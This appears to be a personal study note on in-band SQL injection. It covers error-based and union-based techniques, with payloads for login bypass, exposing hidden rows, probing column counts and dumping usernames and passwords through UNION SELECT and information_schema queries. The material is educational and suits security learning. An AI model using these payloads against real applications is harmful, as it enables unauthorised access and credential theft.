

is a type of SQL injection attack where the attacker uses the **same communication channel** to both **inject malicious SQL queries and retrieve the results from the database**.
It is called _in‑band_ because the **data extraction happens in the same channel as the injection**.

# **Error‑Based SQL Injection**

```mermaid
flowchart LR

A(SQL Injection)

B(In-Band SQLi)
C(Blind SQLi)
D(Out-of-Band SQLi)

E[Error-Based SQLi]
F[Union-Based SQLi]

G[Boolean-Based SQLi]
H[Time-Based SQLi]

I[DNS Base]
J[HTTPS Base]

A --> B
A --> C
A --> D

B --> E
B --> F

C --> G
C --> H

D --> I
D --> J


%% Styles
style A fill:#f4a261,stroke:#333,stroke-width:2px,color:#000

style B fill:#f70800,stroke:#333,stroke-width:1px,color:#000
style C fill:#8bc34a,stroke:#333,stroke-width:1px,color:#000
style D fill:#8bc34a,stroke:#333,stroke-width:1px,color:#000

style E fill:#f70800,stroke:#333,stroke-width:1px,color:#fff
style F fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
style G fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
style H fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
style I fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
style J fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
```


Error‑based SQL injection is a technique where an attacker intentionally triggers database errors to extract information from the database. By injecting specially crafted SQL queries, the attacker forces the database management system to generate error messages that reveal sensitive data such as the database name, table names, column names, or even actual data values. Many databases include detailed error messages when a query fails, and poorly configured applications may display these errors directly in the web response. Attackers exploit this behavior by embedding functions or operations in their payloads that cause errors containing useful information, allowing them to retrieve data quickly through the application’s normal response.


> [!example]+ Retrieving hidden data
>
>Imagine a shopping application that displays products in different categories. When the user clicks on the **Gifts** category, their browser requests the URL:
>
>```
>https://insecure-website.com/products?category=Gifts
>```
>
>This causes the application to make a SQL query to retrieve details of the relevant products from >the database:
>
>```
>SELECT * FROM products WHERE category = 'Gifts' AND released = 1
>```
>
>This SQL query asks the database to return:
>
>- all details (`*`)
>- from the `products` table
>- where the `category` is `Gifts`
>- and `released` is `1`.
>
>The restriction `released = 1` is being used to hide products that are not released. We could assume for unreleased products, `released = 0`.
>
>The application doesn't implement any defenses against SQL injection attacks. This means an attacker can construct the following attack, for example:
>
>```
>https://insecure-website.com/products?category=Gifts'--`
>```
>
>This results in the SQL query:
>
>`SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1`
>
>Crucially, note that `--` is a comment indicator in SQL. This means that the rest of the query is >interpreted as a comment, effectively removing it. In this example, this means the query no longer >includes `AND released = 1`. As a result, all products are displayed, including those that are not yet released.
>
>You can use a similar attack to cause the application to display all the products in any category, including categories that they don't know about:
>
>```
>https://insecure-website.com/products?category=Gifts'+OR+1=1--`
>```
>
>This results in the SQL query:
>
>```
>SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1`
>```
>
>The modified query returns all items where either the `category` is `Gifts`, or `1` is equal to `1`. As `1=1` is always true, the query returns all items.

> [!warning]- Warning
>
>Take care when injecting the condition `OR 1=1` into a SQL query. Even if it appears to be harmless in the context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an `UPDATE` or `DELETE` statement, for example, it can result in an accidental loss of data.

> [!example]- Subverting application logic
>
>Imagine an application that lets users log in with a username and password. If a user submits the username `wiener` and the password `bluecheese`, the application checks the credentials by performing the following SQL query:
>
>```
>SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
>```
>
>If the query returns the details of a user, then the login is successful. Otherwise, it is rejected.
>
>In this case, an attacker can log in as any user without the need for a password. They can do this using the SQL comment sequence `--` to remove the password check from the `WHERE` clause of the query. For example, submitting the username `administrator'--` and a blank password results in the following query:
>
>```
>SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
>```
>
>This query returns the user whose `username` is `administrator` and successfully logs the attacker in as that user.


# **Union‑Based SQL Injection**


```mermaid
flowchart LR

A(SQL Injection)

B(In-Band SQLi)
C(Blind SQLi)
D(Out-of-Band SQLi)

E[Error-Based SQLi]
F[Union-Based SQLi]

G[Boolean-Based SQLi]
H[Time-Based SQLi]

I[DNS Base]
J[HTTPS Base]

A --> B
A --> C
A --> D

B --> E
B --> F

C --> G
C --> H

D --> I
D --> J


%% Styles
style A fill:#f4a261,stroke:#333,stroke-width:2px,color:#000

style B fill:#f70800,stroke:#333,stroke-width:1px,color:#000
style C fill:#8bc34a,stroke:#333,stroke-width:1px,color:#000
style D fill:#8bc34a,stroke:#333,stroke-width:1px,color:#000

style E fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
style F fill:#f70800,stroke:#333,stroke-width:1px,color:#fff
style G fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
style H fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
style I fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
style J fill:#4f79d9,stroke:#333,stroke-width:1px,color:#fff
```

Union‑based SQL injection is a technique that uses the SQL `UNION` operator to combine the results of the original query with the results of a malicious query injected by the attacker. The attacker first determines the number of columns returned by the original query and identifies which columns are displayed in the web application’s response. Then they craft a `UNION SELECT` statement that retrieves data from other tables in the database, such as user credentials or sensitive records. Because the `UNION` operator merges the results of two queries with the same structure, the injected query’s results are returned as part of the normal application output, allowing the attacker to directly view extracted database information on the webpage.

- The attacker finds a vulnerable input field (URL parameter, form, cookie, header).
- Injects malicious SQL code.
- The application sends that query to the database.
- The database executes it.
- The results are returned in the **same HTTP response**.


![[Pasted image 20260502225014.png]]



> [!example]- Retrieving data from other database tables
>
>In cases where the application responds with the results of a SQL query, an attacker can use a SQL injection vulnerability to retrieve data from other tables within the database. You can use the `UNION` keyword to execute an additional `SELECT` query and append the results to the original query.
>
>For example, if an application executes the following query containing the user input `Gifts`:
>
>```
>SELECT name, description FROM products WHERE category = 'Gifts'
>```
>
>An attacker can submit the input:
>```
>' UNION SELECT username, password FROM users--
>```
>This causes the application to return all usernames and passwords along with the names and descriptions of products.

When an application is vulnerable to SQL injection, and the results of the query are returned within the application's responses, you can use the `UNION` keyword to retrieve data from other tables within the database. This is commonly known as a SQL injection UNION attack.

The `UNION` keyword enables you to execute one or more additional `SELECT` queries and append the results to the original query. For example:

```
SELECT a, b FROM table1 UNION SELECT c, d FROM table2
```

This SQL query returns a single result set with two columns, containing values from columns `a` and `b` in `table1` and columns `c` and `d` in `table2`.

For a `UNION` query to work, two key requirements must be met:

- The individual queries must return the same number of columns.
- The data types in each column must be compatible between the individual queries.

To carry out a SQL injection UNION attack, make sure that your attack meets these two requirements. This normally involves finding out:

- How many columns are being returned from the original query.
- Which columns returned from the original query are of a suitable data type to hold the results from the injected query.

When you perform a SQL injection UNION attack, there are two effective methods to determine how many columns are being returned from the original query.

> [!success]+ Method ORDER
>One method involves injecting a series of `ORDER BY` clauses and incrementing the specified column index until an error occurs. For example, if the injection point is a quoted string within the `WHERE` clause of the original query, you would submit:
> T1
>```sql
>default  ORDER BY 1-- 
>default' ORDER BY 1-- 
>default" ORDER BY 1-- 
>```
>T2
>```sql
>' ORDER BY 1-- 
>' ORDER BY 2-- 
>' ORDER BY 3-- 
>etc.
>```
>
>This series of payloads modifies the original query to order the results by different columns in the result set. The column in an `ORDER BY` clause can be specified by its index, so you don't need to know the names of any columns. When the specified column index exceeds the number of actual columns in the result set, the database returns an error, such as:
>
>> [!hint] ERROR
>> The ORDER BY position number 3 is out of range of the number of items in the select list.
>
>The application might actually return the database error in its HTTP response, but it may also issue a generic error response. In other cases, it may simply return no results at all. Either way, as long as you can detect some difference in the response, you can infer how many columns are being returned from the query.

> [!success]+ Method UNION
>The second method involves submitting a series of `UNION SELECT` payloads specifying a different number of null values:
>
>```sql
>' UNION SELECT NULL--
>' UNION SELECT NULL,NULL-- 
>' UNION SELECT NULL,NULL,NULL-- 
>etc.
>```
>
>If the number of nulls does not match the number of columns, the database returns an error, such as:
>
>>[!Hint] ERROR
>>
>All queries combined using a UNION, INTERSECT or EXCEPT operator must have an equal number of expressions in their target lists.
>>
>
>We use `NULL` as the values returned from the injected `SELECT` query because the data types in each column must be compatible between the original and the injected queries. `NULL` is convertible to every common data type, so it maximizes the chance that the payload will succeed when the column count is correct.
>
>As with the `ORDER BY` technique, the application might actually return the database error in its HTTP response, but may return a generic error or simply return no results. When the number of nulls matches the number of columns, the database returns an additional row in the result set, containing null values in each column. The effect on the HTTP response depends on the application's code. If you are lucky, you will see some additional content within the response, such as an extra row on an HTML table. Otherwise, the null values might trigger a different error, such as a `NullPointerException`. In the worst case, the response might look the same as a response caused by an incorrect number of nulls. This would make this method ineffective.

On Oracle, every `SELECT` query must use the `FROM` keyword and specify a valid table. There is a built-in table on Oracle called `dual` which can be used for this purpose. So the injected queries on Oracle would need to look like:

```sql
' UNION SELECT NULL FROM DUAL--
```

The payloads described use the double-dash comment sequence `--` to comment out the remainder of the original query following the injection point. On MySQL, the double-dash sequence must be followed by a space. Alternatively, the hash character `#` can be used to identify a comment.

A SQL injection UNION attack enables you to retrieve the results from an injected query. The interesting data that you want to retrieve is normally in string form. This means you need to find one or more columns in the original query results whose data type is, or is compatible with, string data.

> [!info]+ Type 
>After you determine the number of required columns, you can probe each column to test whether it can hold string data. You can submit a series of `UNION SELECT` payloads that place a string value into each column in turn. For example, if the query returns four columns, you would submit:
>
>```
>' UNION SELECT 'a',NULL,NULL,NULL--
>' UNION SELECT NULL,'a',NULL,NULL-- 
>' UNION SELECT NULL,NULL,'a',NULL-- 
>' UNION SELECT NULL,NULL,NULL,'a'--
>```
>
>If the column data type is not compatible with string data, the injected query will cause a database error, such as:
>
>`Conversion failed when converting the varchar value 'a' to data type int.`
>
>If an error does not occur, and the application's response contains some additional content including the injected string value, then the relevant column is suitable for retrieving string data.
>
>When you have determined the number of columns returned by the original query and found which columns can hold string data, you are in a position to retrieve interesting data.
>
>Suppose that:
>
>- The original query returns two columns, both of which can hold string data.
>- The injection point is a quoted string within the `WHERE` clause.
>- The database contains a table called `users` with the columns `username` and `password`.
>
>In this example, you can retrieve the contents of the `users` table by submitting the input:
>```
>' UNION SELECT username, password FROM users--
>```
>In order to perform this attack, you need to know that there is a table called `users` with two columns called `username` and `password`. Without this information, you would have to guess the names of the tables and columns. All modern databases provide ways to examine the database structure, and determine what tables and columns they contain.

## Retrieving multiple values within a single column

In some cases the query in the previous example may only return a single column.

You can retrieve multiple values together within this single column by concatenating the values together. You can include a separator to let you distinguish the combined values. For example, on Oracle you could submit the input:


```sql
--- Oracle
' UNION SELECT username || '~' || password FROM users--
```
```sql
--- mysql
SELECT CONCAT(first_name, ' ', last_name, ':', email) FROM users--
```

This uses the double-pipe sequence `||` which is a string concatenation operator on Oracle. The injected query concatenates together the values of the `username` and `password` fields, separated by the `~` character.

The results from the query contain all the usernames and passwords, for example:

```http
administrator~s3cure
wiener~peter 
carlos~montoya 
```

Different databases use different syntax to perform string concatenation.
## Listing the contents of the database

Most database types (except Oracle) have a set of views called the information schema. This provides information about the database.

For example, you can query `information_schema.tables` to list the tables in the database:

`SELECT * FROM information_schema.tables`

This returns output like the following:

```sql
TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME   TABLE_TYPE =====================================================
MyDatabase        dbo         Products     BASE TABLE 
MyDatabase        dbo         Users        BASE TABLE
MyDatabase        dbo         Feedback     BASE TABLE
```

This output indicates that there are three tables, called `Products`, `Users`, and `Feedback`.

You can then query `information_schema.columns` to list the columns in individual tables:

```sql
SELECT * FROM information_schema.columns WHERE table_name = 'Users'
```

This returns output like the following:
```sql
TABLE_CATALOG  TABLE_SCHEMA   TABLE_NAME  COLUMN_NAME   DATA_TYPE =================================================================
MyDatabase         dbo          Users       UserId        int 
MyDatabase         dbo          Users       Username      varchar 
MyDatabase         dbo          Users       Password      varchar
```

This output shows the columns in the specified table and the data type of each column.
On Oracle, you can find the same information as follows:

- You can list tables by querying `all_tables`
```sql
SELECT * FROM all_tables
``` 

- You can list columns by querying `all_tab_columns`
```sql
SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
```


> [!hint]
> ```sql
> select schema_name from information_schema.schemata
> ```
> ```sql
> select table_name from information_schema.tables
> ```
> ```sql
> select column_name from information_schema.columns
> ```
>```sql
> select group_concat(schema_name) from information_schema.schemata
> ```
>```sql
> select group_concat(table_name) from information_schema.tables where table_schema=database()-- 
> ```
> ```sql
> select group_concat(column_name) from information_schema.columns where table_schema=<DSName> and table_name=<TableName>
> ```
